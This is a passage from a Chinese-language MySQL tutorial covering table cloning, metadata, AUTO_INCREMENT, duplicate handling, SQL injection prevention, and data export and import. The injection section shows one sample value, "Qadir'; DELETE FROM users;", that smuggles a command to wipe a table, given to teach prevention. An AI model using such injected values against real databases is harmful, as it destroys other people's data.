<p>执行完第二步骤后，你将在数据库中创建新的克隆表 clone_tbl。 如果你想拷贝数据表的数据你可以使用 INSERT INTO… SELECT 语句来实现。<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; INSERT INTO clone_tbl (runoob_id,</span><br><span class="line">    -&gt;                        runoob_title,</span><br><span class="line">    -&gt;                        runoob_author,</span><br><span class="line">    -&gt;                        submission_date)</span><br><span class="line">    -&gt; SELECT runoob_id,runoob_title,</span><br><span class="line">    -&gt;        runoob_author,submission_date</span><br><span class="line">    -&gt; FROM runoob_tbl;</span><br><span class="line">Query OK, 3 rows affected (0.07 sec)</span><br><span class="line">Records: 3  Duplicates: 0  Warnings: 0</span><br></pre></td></tr></table></figure></p>
<p>执行以上步骤后，你将完整的复制表，包括表结构及表数据。</p>
<h1 id="MySQL-元数据"><a href="#MySQL-元数据" class="headerlink" title="MySQL 元数据"></a>MySQL 元数据</h1><p>你可能想知道MySQL以下三种信息：</p>
<ol>
<li>查询结果信息： SELECT, UPDATE 或 DELETE语句影响的记录数。</li>
<li>数据库和数据表的信息： 包含了数据库及数据表的结构信息。</li>
<li>MySQL服务器信息： 包含了数据库服务器的当前状态，版本号等。</li>
</ol>
<h1 id="获取服务器元数据"><a href="#获取服务器元数据" class="headerlink" title="获取服务器元数据"></a>获取服务器元数据</h1><p>以下命令语句可以在 MySQL 的命令提示符使用，也可以在脚本中 使用，如PHP脚本。</p>
<p>命令    描述<br>SELECT VERSION( )    服务器版本信息<br>SELECT DATABASE( )    当前数据库名 (或者返回空)<br>SELECT USER( )    当前用户名<br>SHOW STATUS    服务器状态<br>SHOW VARIABLES    服务器配置变量</p>
<h1 id="MySQL-序列使用"><a href="#MySQL-序列使用" class="headerlink" title="MySQL 序列使用"></a>MySQL 序列使用</h1><p>MySQL 序列是一组整数：1, 2, 3, …，由于一张数据表只能有一个字段自增主键， 如果你想实现其他字段也实现自动增加，就可以使用MySQL序列来实现。</p>
<p>本章我们将介绍如何使用MySQL的序列。</p>
<h2 id="使用-AUTO-INCREMENT"><a href="#使用-AUTO-INCREMENT" class="headerlink" title="使用 AUTO_INCREMENT"></a>使用 AUTO_INCREMENT</h2><p>MySQL 中最简单使用序列的方法就是使用 MySQL AUTO_INCREMENT 来定义列。</p>
<h2 id="实例-9"><a href="#实例-9" class="headerlink" title="实例"></a>实例</h2><p>以下实例中创建了数据表 insect， insect 表中 id 无需指定值可实现自动增长。<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; CREATE TABLE insect</span><br><span class="line">    -&gt; (</span><br><span class="line">    -&gt; id INT UNSIGNED NOT NULL AUTO_INCREMENT,</span><br><span class="line">    -&gt; PRIMARY KEY (id),</span><br><span class="line">    -&gt; name VARCHAR(30) NOT NULL, # type of insect</span><br><span class="line">    -&gt; date DATE NOT NULL, # date collected</span><br><span class="line">    -&gt; origin VARCHAR(30) NOT NULL # where collected</span><br><span class="line">);</span><br><span class="line">Query OK, 0 rows affected (0.02 sec)</span><br><span class="line">mysql&gt; INSERT INTO insect (id,name,date,origin) VALUES</span><br><span class="line">    -&gt; (NULL,'housefly','2001-09-10','kitchen'),</span><br><span class="line">    -&gt; (NULL,'millipede','2001-09-10','driveway'),</span><br><span class="line">    -&gt; (NULL,'grasshopper','2001-09-10','front yard');</span><br><span class="line">Query OK, 3 rows affected (0.02 sec)</span><br><span class="line">Records: 3  Duplicates: 0  Warnings: 0</span><br><span class="line">mysql&gt; SELECT * FROM insect ORDER BY id;</span><br><span class="line">+<span class="comment">----+-------------+------------+------------+</span></span><br><span class="line">| id | name        | date       | origin     |</span><br><span class="line">+<span class="comment">----+-------------+------------+------------+</span></span><br><span class="line">|  1 | housefly    | 2001-09-10 | kitchen    |</span><br><span class="line">|  2 | millipede   | 2001-09-10 | driveway   |</span><br><span class="line">|  3 | grasshopper | 2001-09-10 | front yard |</span><br><span class="line">+<span class="comment">----+-------------+------------+------------+</span></span><br><span class="line">3 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></p>
<h2 id="获取AUTO-INCREMENT值"><a href="#获取AUTO-INCREMENT值" class="headerlink" title="获取AUTO_INCREMENT值"></a>获取AUTO_INCREMENT值</h2><p>在MySQL的客户端中你可以使用 SQL中的LAST_INSERT_ID( ) 函数来获取最后的插入表中的自增列的值。</p>
<h2 id="重置序列"><a href="#重置序列" class="headerlink" title="重置序列"></a>重置序列</h2><p>如果你删除了数据表中的多条记录，并希望对剩下数据的AUTO_INCREMENT列进行重新排列，那么你可以通过删除自增的列，然后重新添加来实现。 不过该操作要非常小心，如果在删除的同时又有新记录添加，有可能会出现数据混乱。操作如下所示：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; ALTER TABLE insect DROP id;</span><br><span class="line">mysql&gt; ALTER TABLE insect</span><br><span class="line">    -&gt; ADD id INT UNSIGNED NOT NULL AUTO_INCREMENT FIRST,</span><br><span class="line">    -&gt; ADD PRIMARY KEY (id);</span><br></pre></td></tr></table></figure></p>
<h2 id="设置序列的开始值"><a href="#设置序列的开始值" class="headerlink" title="设置序列的开始值"></a>设置序列的开始值</h2><p>一般情况下序列的开始值为1，但如果你需要指定一个开始值100，那我们可以通过以下语句来实现<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; CREATE TABLE insect</span><br><span class="line">    -&gt; (</span><br><span class="line">    -&gt; id INT UNSIGNED NOT NULL AUTO_INCREMENT,</span><br><span class="line">    -&gt; PRIMARY KEY (id),</span><br><span class="line">    -&gt; name VARCHAR(30) NOT NULL, </span><br><span class="line">    -&gt; date DATE NOT NULL,</span><br><span class="line">    -&gt; origin VARCHAR(30) NOT NULL</span><br><span class="line">)engine=innodb auto_increment=100 charset=utf8;</span><br></pre></td></tr></table></figure></p>
<p>或者你也可以在表创建成功后，通过以下语句来实现：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; ALTER TABLE t AUTO_INCREMENT = 100;</span><br></pre></td></tr></table></figure></p>
<h1 id="MySQL-处理重复数据"><a href="#MySQL-处理重复数据" class="headerlink" title="MySQL 处理重复数据"></a>MySQL 处理重复数据</h1><p>有些 MySQL 数据表中可能存在重复的记录，有些情况我们允许重复数据的存在，但有时候我们也需要删除这些重复的数据。</p>
<p>本章节我们将为大家介绍如何防止数据表出现重复数据及如何删除数据表中的重复数据。</p>
<h2 id="防止表中出现重复数据"><a href="#防止表中出现重复数据" class="headerlink" title="防止表中出现重复数据"></a>防止表中出现重复数据</h2><p>你可以在 MySQL 数据表中设置指定的字段为 PRIMARY KEY（主键） 或者 UNIQUE（唯一） 索引来保证数据的唯一性。<br>让我们尝试一个实例：下表中无索引及主键，所以该表允许出现多条重复记录。<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> person_tbl</span><br><span class="line">(</span><br><span class="line">    first_name <span class="built_in">CHAR</span>(<span class="number">20</span>),</span><br><span class="line">    last_name <span class="built_in">CHAR</span>(<span class="number">20</span>),</span><br><span class="line">    sex <span class="built_in">CHAR</span>(<span class="number">10</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure></p>
<p>如果你想设置表中字段 first_name，last_name 数据不能重复，你可以设置双主键模式来设置数据的唯一性， 如果你设置了双主键，那么那个键的默认值不能为 NULL，可设置为 NOT NULL。如下所示：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> person_tbl</span><br><span class="line">(</span><br><span class="line">   first_name <span class="built_in">CHAR</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">   last_name <span class="built_in">CHAR</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">   sex <span class="built_in">CHAR</span>(<span class="number">10</span>),</span><br><span class="line">   PRIMARY <span class="keyword">KEY</span> (last_name, first_name)</span><br><span class="line">);</span><br></pre></td></tr></table></figure></p>
<p>如果我们设置了唯一索引，那么在插入重复数据时，SQL 语句将无法执行成功,并抛出错。</p>
<p>INSERT IGNORE INTO 与 INSERT INTO 的区别就是 INSERT IGNORE 会忽略数据库中已经存在的数据，如果数据库没有数据，就插入新的数据，如果有数据的话就跳过这条数据。这样就可以保留数据库中已经存在数据，达到在间隙中插入数据的目的。</p>
<p>以下实例使用了 INSERT IGNORE INTO，执行后不会出错，也不会向数据表中插入重复数据：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; INSERT IGNORE INTO person_tbl (last_name, first_name)</span><br><span class="line">    -&gt; VALUES( 'Jay', 'Thomas');</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line">mysql&gt; INSERT IGNORE INTO person_tbl (last_name, first_name)</span><br><span class="line">    -&gt; VALUES( 'Jay', 'Thomas');</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure></p>
<p>INSERT IGNORE INTO 当插入数据时，在设置了记录的唯一性后，如果插入重复数据，将不返回错误，只以警告形式返回。 而 REPLACE INTO 如果存在 primary 或 unique 相同的记录，则先删除掉。再插入新记录。</p>
<p>另一种设置数据的唯一性方法是添加一个 UNIQUE 索引，如下所示：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> person_tbl</span><br><span class="line">(</span><br><span class="line">   first_name <span class="built_in">CHAR</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">   last_name <span class="built_in">CHAR</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">   sex <span class="built_in">CHAR</span>(<span class="number">10</span>),</span><br><span class="line">   <span class="keyword">UNIQUE</span> (last_name, first_name)</span><br><span class="line">);</span><br></pre></td></tr></table></figure></p>
<h2 id="统计重复数据"><a href="#统计重复数据" class="headerlink" title="统计重复数据"></a>统计重复数据</h2><p>以下我们将统计表中 first_name 和 last_name的重复记录数：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT COUNT(*) as repetitions, last_name, first_name</span><br><span class="line">    -&gt; FROM person_tbl</span><br><span class="line">    -&gt; GROUP BY last_name, first_name</span><br><span class="line">    -&gt; HAVING repetitions &gt; 1;</span><br></pre></td></tr></table></figure></p>
<p>以上查询语句将返回 person_tbl 表中重复的记录数。 一般情况下，查询重复的值，请执行以下操作：</p>
<ol>
<li>确定哪一列包含的值可能会重复。</li>
<li>在列选择列表使用COUNT(*)列出的那些列。</li>
<li>在GROUP BY子句中列出的列。</li>
<li>HAVING子句设置重复数大于1。</li>
</ol>
<h2 id="过滤重复数据"><a href="#过滤重复数据" class="headerlink" title="过滤重复数据"></a>过滤重复数据</h2><p>如果你需要读取不重复的数据可以在 SELECT 语句中使用 DISTINCT 关键字来过滤重复数据。<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT DISTINCT last_name, first_name</span><br><span class="line">    -&gt; FROM person_tbl;</span><br></pre></td></tr></table></figure></p>
<p>你也可以使用 GROUP BY 来读取数据表中不重复的数据：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT last_name, first_name</span><br><span class="line">    -&gt; FROM person_tbl</span><br><span class="line">    -&gt; GROUP BY (last_name, first_name);</span><br></pre></td></tr></table></figure></p>
<h2 id="删除重复数据"><a href="#删除重复数据" class="headerlink" title="删除重复数据"></a>删除重复数据</h2><p>如果你想删除数据表中的重复数据，你可以使用以下的SQL语句：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; CREATE TABLE tmp SELECT last_name, first_name, sex FROM person_tbl  GROUP BY (last_name, first_name, sex);</span><br><span class="line">mysql&gt; DROP TABLE person_tbl;</span><br><span class="line">mysql&gt; ALTER TABLE tmp RENAME TO person_tbl;</span><br></pre></td></tr></table></figure></p>
<p>当然你也可以在数据表中添加 INDEX（索引） 和 PRIMAY KEY（主键）这种简单的方法来删除表中的重复记录。方法如下：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; ALTER IGNORE TABLE person_tbl</span><br><span class="line">    -&gt; ADD PRIMARY KEY (last_name, first_name);</span><br></pre></td></tr></table></figure></p>
<h1 id="MySQL-及-SQL-注入"><a href="#MySQL-及-SQL-注入" class="headerlink" title="MySQL 及 SQL 注入"></a>MySQL 及 SQL 注入</h1><p>如果您通过网页获取用户输入的数据并将其插入一个MySQL数据库，那么就有可能发生SQL注入安全的问题。</p>
<p>本章节将为大家介绍如何防止SQL注入，并通过脚本来过滤SQL中注入的字符。</p>
<p>所谓SQL注入，就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</p>
<p>我们永远不要信任用户的输入，我们必须认定用户输入的数据都是不安全的，我们都需要对用户输入的数据进行过滤处理。</p>
<p>以下实例中，输入的用户名必须为字母、数字及下划线的组合，且用户名长度为 8 到 20 个字符之间：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/^\w&#123;8,20&#125;$/"</span>, $_GET[<span class="string">'username'</span>], $matches))</span><br><span class="line">&#123;</span><br><span class="line">   $result = mysqli_query($conn, <span class="string">"SELECT * FROM users </span></span><br><span class="line"><span class="string">                          WHERE username=$matches[0]"</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"username 输入异常"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>让我们看下在没有过滤特殊字符时，出现的SQL情况：<br>// 设定$name 中插入了我们不需要的SQL语句<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$name = "Qadir'; <span class="keyword">DELETE</span> <span class="keyword">FROM</span> <span class="keyword">users</span>;";</span><br><span class="line"> mysqli_query($conn, "<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">name</span>=<span class="string">'&#123;$name&#125;'</span><span class="string">");</span></span><br></pre></td></tr></table></figure></p>
<p>以上的注入语句中，我们没有对 $name 的变量进行过滤，$name 中插入了我们不需要的SQL语句，将删除 users 表中的所有数据。</p>
<p>防止SQL注入，我们需要注意以下几个要点：</p>
<ol>
<li>永远不要信任用户的输入。对用户的输入进行校验，可以通过正则表达式，或限制长度；对单引号和 双”-“进行转换等。</li>
<li>永远不要使用动态拼装sql，可以使用参数化的sql或者直接使用存储过程进行数据查询存取。</li>
<li>永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。</li>
<li>不要把机密信息直接存放，加密或者hash掉密码和敏感的信息。</li>
<li>应用的异常信息应该给出尽可能少的提示，最好使用自定义的错误信息对原始错误信息进行包装</li>
<li>sql注入的检测方法一般采取辅助软件或网站平台来检测，软件一般采用sql注入检测工具jsky，网站平台就有亿思网站安全平台检测工具。MDCSOFT SCAN等。采用MDCSOFT-IPS可以有效的防御SQL注入，XSS攻击等。</li>
</ol>
<h1 id="MySQL-导出数据"><a href="#MySQL-导出数据" class="headerlink" title="MySQL 导出数据"></a>MySQL 导出数据</h1><p>MySQL中你可以使用SELECT…INTO OUTFILE语句来简单的导出数据到文本文件上。</p>
<h2 id="使用-SELECT-…-INTO-OUTFILE-语句导出数据"><a href="#使用-SELECT-…-INTO-OUTFILE-语句导出数据" class="headerlink" title="使用 SELECT … INTO OUTFILE 语句导出数据"></a>使用 SELECT … INTO OUTFILE 语句导出数据</h2><p>以下实例中我们将数据表 runoob_tbl 数据导出到 /tmp/runoob.txt 文件中:<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM runoob_tbl </span><br><span class="line">    -&gt; INTO OUTFILE '/tmp/runoob.txt';</span><br></pre></td></tr></table></figure></p>
<p>你可以通过命令选项来设置数据输出的指定格式，以下实例为导出 CSV 格式：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM passwd INTO OUTFILE '/tmp/runoob.txt'</span><br><span class="line">    -&gt; FIELDS TERMINATED BY ',' ENCLOSED BY '"'</span><br><span class="line">    -&gt; LINES TERMINATED BY '\r\n';</span><br></pre></td></tr></table></figure></p>
<p>在下面的例子中，生成一个文件，各值用逗号隔开。这种格式可以被许多程序使用。<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> a,b,a+b <span class="keyword">INTO</span> <span class="keyword">OUTFILE</span> <span class="string">'/tmp/result.text'</span></span><br><span class="line"><span class="keyword">FIELDS</span> <span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="string">','</span> <span class="keyword">OPTIONALLY</span> <span class="keyword">ENCLOSED</span> <span class="keyword">BY</span> <span class="string">'"'</span></span><br><span class="line"><span class="keyword">LINES</span> <span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="string">'\n'</span></span><br><span class="line"><span class="keyword">FROM</span> test_table;</span><br></pre></td></tr></table></figure></p>
<h2 id="SELECT-…-INTO-OUTFILE-语句有以下属性"><a href="#SELECT-…-INTO-OUTFILE-语句有以下属性" class="headerlink" title="SELECT … INTO OUTFILE 语句有以下属性:"></a>SELECT … INTO OUTFILE 语句有以下属性:</h2><ol>
<li>LOAD DATA INFILE是SELECT … INTO OUTFILE的逆操作，SELECT句法。为了将一个数据库的数据写入一个文件，使用SELECT … INTO OUTFILE，为了将文件读回数据库，使用LOAD DATA INFILE。</li>
<li>SELECT…INTO OUTFILE ‘file_name’形式的SELECT可以把被选择的行写入一个文件中。该文件被创建到服务器主机上，因此您必须拥有FILE权限，才能使用此语法。</li>
<li>输出不能是一个已存在的文件。防止文件数据被篡改。</li>
<li>你需要有一个登陆服务器的账号来检索文件。否则 SELECT … INTO OUTFILE 不会起任何作用。</li>
<li>在UNIX中，该文件被创建后是可读的，权限由MySQL服务器所拥有。这意味着，虽然你就可以读取该文件，但可能无法将其删除。</li>
</ol>
<h2 id="导出表作为原始数据"><a href="#导出表作为原始数据" class="headerlink" title="导出表作为原始数据"></a>导出表作为原始数据</h2><p>mysqldump 是 mysql 用于转存储数据库的实用程序。它主要产生一个 SQL 脚本，其中包含从头重新创建数据库所必需的命令 CREATE TABLE INSERT 等。</p>
<p>使用 mysqldump 导出数据需要使用 –tab 选项来指定导出文件指定的目录，该目标必须是可写的。</p>
<p>以下实例将数据表 runoob_tbl 导出到 /tmp 目录中：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">$ mysqldump -u root -p <span class="comment">--no-create-info \</span></span><br><span class="line">            <span class="comment">--tab=/tmp RUNOOB runoob_tbl</span></span><br><span class="line">password ******</span><br></pre></td></tr></table></figure></p>
<h2 id="导出-SQL-格式的数据"><a href="#导出-SQL-格式的数据" class="headerlink" title="导出 SQL 格式的数据"></a>导出 SQL 格式的数据</h2><p>导出 SQL 格式的数据到指定文件，如下所示：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">$ mysqldump -u root -p RUNOOB runoob_tbl &gt; dump.txt</span><br><span class="line">password ******</span><br></pre></td></tr></table></figure></p>
<p>以上命令创建的文件内容如下：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- MySQL dump 8.23</span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">-- Host: localhost    Database: RUNOOB</span></span><br><span class="line"><span class="comment">---------------------------------------------------------</span></span><br><span class="line"><span class="comment">-- Server version       3.23.58</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">-- Table structure for table `runoob_tbl`</span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> runoob_tbl (</span><br><span class="line">  runoob_id <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> auto_increment,</span><br><span class="line">  runoob_title <span class="built_in">varchar</span>(<span class="number">100</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">default</span> <span class="string">''</span>,</span><br><span class="line">  runoob_author <span class="built_in">varchar</span>(<span class="number">40</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">default</span> <span class="string">''</span>,</span><br><span class="line">  submission_date <span class="built_in">date</span> <span class="keyword">default</span> <span class="literal">NULL</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span>  (runoob_id),</span><br><span class="line">  <span class="keyword">UNIQUE</span> <span class="keyword">KEY</span> AUTHOR_INDEX (runoob_author)</span><br><span class="line">) <span class="keyword">TYPE</span>=MyISAM;</span><br><span class="line"></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">-- Dumping data for table `runoob_tbl`</span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> runoob_tbl </span><br><span class="line">       <span class="keyword">VALUES</span> (<span class="number">1</span>,<span class="string">'Learn PHP'</span>,<span class="string">'John Poul'</span>,<span class="string">'2007-05-24'</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> runoob_tbl </span><br><span class="line">       <span class="keyword">VALUES</span> (<span class="number">2</span>,<span class="string">'Learn MySQL'</span>,<span class="string">'Abdul S'</span>,<span class="string">'2007-05-24'</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> runoob_tbl </span><br><span class="line">       <span class="keyword">VALUES</span> (<span class="number">3</span>,<span class="string">'JAVA Tutorial'</span>,<span class="string">'Sanjay'</span>,<span class="string">'2007-05-06'</span>);</span><br></pre></td></tr></table></figure></p>
<p>如果你需要导出整个数据库的数据，可以使用以下命令：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">$ mysqldump -u root -p RUNOOB &gt; database_dump.txt</span><br><span class="line">password ******</span><br></pre></td></tr></table></figure></p>
<p>如果需要备份所有数据库，可以使用以下命令：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">$ mysqldump -u root -p <span class="comment">--all-databases &gt; database_dump.txt</span></span><br><span class="line">password ******</span><br></pre></td></tr></table></figure></p>
<p>–all-databases 选项在 MySQL 3.23.12 及以后版本加入。</p>
<p>该方法可用于实现数据库的备份策略。</p>
<h2 id="将数据表及数据库拷贝至其他主机"><a href="#将数据表及数据库拷贝至其他主机" class="headerlink" title="将数据表及数据库拷贝至其他主机"></a>将数据表及数据库拷贝至其他主机</h2><p>如果你需要将数据拷贝至其他的 MySQL 服务器上, 你可以在 mysqldump 命令中指定数据库名及数据表。</p>
<p>在源主机上执行以下命令，将数据备份至 dump.txt 文件中:<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">$ mysqldump -u root -p database_name table_name &gt; dump.txt</span><br><span class="line">password *****</span><br></pre></td></tr></table></figure></p>
<p>如果完整备份数据库，则无需使用特定的表名称。<br>如果你需要将备份的数据库导入到MySQL服务器中，可以使用以下命令，使用以下命令你需要确认数据库已经创建：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">$ mysql -u root -p database_name &lt; dump.txt</span><br><span class="line">password *****</span><br></pre></td></tr></table></figure></p>
<p>你也可以使用以下命令将导出的数据直接导入到远程的服务器上，但请确保两台服务器是相通的，是可以相互访问的：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$ mysqldump -u root -p database_name \</span><br><span class="line">       | mysql -h other-host.com database_name</span><br></pre></td></tr></table></figure></p>
<p>以上命令中使用了管道来将导出的数据导入到指定的远程主机上。</p>
<h1 id="MySQL-导入数据"><a href="#MySQL-导入数据" class="headerlink" title="MySQL 导入数据"></a>MySQL 导入数据</h1><p>本章节我们为大家介绍几种简单的 MySQL 导入数据命令。</p>
<h2 id="1、mysql-命令导入"><a href="#1、mysql-命令导入" class="headerlink" title="1、mysql 命令导入"></a>1、mysql 命令导入</h2><p>使用 mysql 命令导入语法格式为：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql -u用户名    -p密码    &lt;  要导入的数据库数据(runoob.sql)</span><br></pre></td></tr></table></figure></p>
<p>实例：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment"># mysql -uroot -p123456 &lt; runoob.sql</span></span><br></pre></td></tr></table></figure></p>
<p>以上命令将将备份的整个数据库 runoob.sql 导入。</p>
<h2 id="2、source-命令导入"><a href="#2、source-命令导入" class="headerlink" title="2、source 命令导入"></a>2、source 命令导入</h2><p>source 命令导入数据库需要先登录到数库终端：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; create database abc;      # 创建数据库</span><br><span class="line">mysql&gt; use abc;                  # 使用已创建的数据库 </span><br><span class="line">mysql&gt; set names utf8;           # 设置编码</span><br><span class="line">mysql&gt; source /home/abc/abc.sql  # 导入备份数据库</span><br></pre></td></tr></table></figure></p>
<h2 id="3、使用-LOAD-DATA-导入数据"><a href="#3、使用-LOAD-DATA-导入数据" class="headerlink" title="3、使用 LOAD DATA 导入数据"></a>3、使用 LOAD DATA 导入数据</h2><p>MySQL 中提供了LOAD DATA INFILE语句来插入数据。 以下实例中将从当前目录中读取文件 dump.txt ，将该文件中的数据插入到当前数据库的 mytbl 表中。<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; LOAD DATA LOCAL INFILE 'dump.txt' INTO TABLE mytbl;</span><br></pre></td></tr></table></figure></p>
<p>如果指定LOCAL关键词，则表明从客户主机上按路径读取文件。如果没有指定，则文件在服务器上按路径读取文件。</p>
<p>你能明确地在LOAD DATA语句中指出列值的分隔符和行尾标记，但是默认标记是定位符和换行符。</p>
<p>两个命令的 FIELDS 和 LINES 子句的语法是一样的。两个子句都是可选的，但是如果两个同时被指定，FIELDS 子句必须出现在 LINES 子句之前。</p>
<p>如果用户指定一个 FIELDS 子句，它的子句 （TERMINATED BY、[OPTIONALLY] ENCLOSED BY 和 ESCAPED BY) 也是可选的，不过，用户必须至少指定它们中的一个。<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; LOAD DATA LOCAL INFILE 'dump.txt' INTO TABLE mytbl</span><br><span class="line">  -&gt; FIELDS TERMINATED BY ':'</span><br><span class="line">  -&gt; LINES TERMINATED BY '\r\n';</span><br></pre></td></tr></table></figure></p>
<p>LOAD DATA 默认情况下是按照数据文件中列的顺序插入数据的，如果数据文件中的列与插入表中的列不一致，则需要指定列的顺序。</p>
<p>如，在数据文件中的列顺序是 a,b,c，但在插入表的列顺序为b,c,a，则数据导入语法如下：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; LOAD DATA LOCAL INFILE 'dump.txt' </span><br><span class="line">    -&gt; INTO TABLE mytbl (b, c, a);</span><br></pre></td></tr></table></figure></p>
<h2 id="4、使用-mysqlimport-导入数据"><a href="#4、使用-mysqlimport-导入数据" class="headerlink" title="4、使用 mysqlimport 导入数据"></a>4、使用 mysqlimport 导入数据</h2><p>mysqlimport客户端提供了LOAD DATA INFILEQL语句的一个命令行接口。mysqlimport的大多数选项直接对应LOAD DATA INFILE子句。</p>
<p>从文件 dump.txt 中将数据导入到 mytbl 数据表中, 可以使用以下命令：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">$ mysqlimport -u root -p <span class="comment">--local database_name dump.txt</span></span><br><span class="line">password *****</span><br></pre></td></tr></table></figure></p>
<p>mysqlimport命令可以指定选项来设置指定格式,命令语句格式如下：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">$ mysqlimport -u root -p <span class="comment">--local --fields-terminated-by=":" \</span></span><br><span class="line">   <span class="comment">--lines-terminated-by="\r\n"  database_name dump.txt</span></span><br><span class="line">password *****</span><br></pre></td></tr></table></figure></p>
<p>mysqlimport 语句中使用 –columns 选项来设置列的顺序：<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">$ mysqlimport -u root -p <span class="comment">--local --columns=b,c,a \</span></span><br><span class="line">    database_name dump.txt</span><br><span class="line">password *****</span><br></pre></td></tr></table></figure></p>
<h2 id="mysqlimport的常用选项介绍"><a href="#mysqlimport的常用选项介绍" class="headerlink" title="mysqlimport的常用选项介绍"></a>mysqlimport的常用选项介绍</h2><p>选项    功能<br>-d or –delete    新数据导入数据表中之前删除数据数据表中的所有信息<br>-f or –force    不管是否遇到错误，mysqlimport将强制继续插入数据<br>-i or –ignore    mysqlimport跳过或者忽略那些有相同唯一 关键字的行， 导入文件中的数据将被忽略。<br>-l or -lock-tables    数据被插入之前锁住表，这样就防止了， 你在更新数据库时，用户的查询和更新受到影响。<br>-r or -replace    这个选项与－i选项的作用相反；此选项将替代 表中有相同唯一关键字的记录。<br>–fields-enclosed- by= char    指定文本文件中数据的记录时以什么括起的， 很多情况下 数据以双引号括起。 默认的情况下数据是没有被字符括起的。<br>–fields-terminated- by=char    指定各个数据的值之间的分隔符，在句号分隔的文件中， 分隔符是句号。您可以用此选项指定数据之间的分隔符。 默认的分隔符是跳格符（Tab）<br>–lines-terminated- by=str    此选项指定文本文件中行与行之间数据的分隔字符串 或者字符。 默认的情况下mysqlimport以newline为行分隔符。 您可以选择用一个字符串来替代一个单个的字符： 一个新行或者一个回车。</p>
<p>mysqlimport命令常用的选项还有-v 显示版本（version）， -p 提示输入密码（password）等。</p>
<h1 id="MySQL-函数"><a href="#MySQL-函数" class="headerlink" title="MySQL 函数"></a>MySQL 函数</h1><p>MySQL 有很多内置的函数，以下列出了这些函数的说明。</p>
